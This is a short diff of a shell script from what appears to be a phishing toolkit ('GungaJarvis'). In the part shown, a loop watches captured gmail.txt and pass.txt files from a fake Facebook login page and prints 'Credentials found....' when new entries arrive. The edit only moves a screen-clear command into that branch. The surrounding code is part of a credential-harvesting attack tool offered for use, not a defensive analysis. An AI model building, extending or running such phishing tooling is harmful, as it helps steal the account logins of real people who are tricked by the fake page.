@@ -103,7 +103,6 @@ echo -e '\n\n'
 start_server
 
 transfer_items() {
-clear
 cd $HOME/GungaJarvis/utils/phishing/websites/facebook
 while true
 do
@@ -111,6 +110,7 @@ after_gmail=$(wc -l < gmail.txt)
 after_pass=$(wc -l < pass.txt)
 if [[ $after_gmail -gt $before_gmail && $after_pass -gt $before_pass ]]; then
 echo ''
+clear
 echo -e 'Credentials found....'
 cd $HOME/GungaJarvis/utils/phishing/websites/facebook
 echo -e '\n\n'
